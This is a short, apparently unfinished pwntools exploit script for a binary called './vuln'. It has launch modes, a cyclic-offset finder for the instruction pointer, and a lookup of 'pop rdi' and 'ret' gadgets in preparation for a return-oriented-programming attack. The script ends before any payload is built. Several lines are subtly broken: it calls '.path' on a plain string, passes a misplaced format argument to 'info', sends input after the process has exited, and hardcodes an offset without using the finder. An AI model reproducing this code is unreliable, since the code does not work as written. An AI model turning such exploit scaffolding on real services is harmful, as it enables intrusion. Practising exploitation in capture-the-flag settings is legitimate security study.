#!/bin/env python3
from pwn import *


exe = './vuln'
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p  = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>', '1')
    p.wait()

    p.sendlineafter('>', '1')
    p.sendlineafter('>', '1')
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    info('located eip offset at {a}',format(a=ip_offset))
    return ip_offset

gdbscript = '''
init-pwndbg
piebase 
continue
'''.format(**locals())
offset_num = 5
p = process(exe.path)
offset = b'A'* offset_num

rop = ROP([exe])
pop_rdi = rop.find_gadget(['pop_rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]


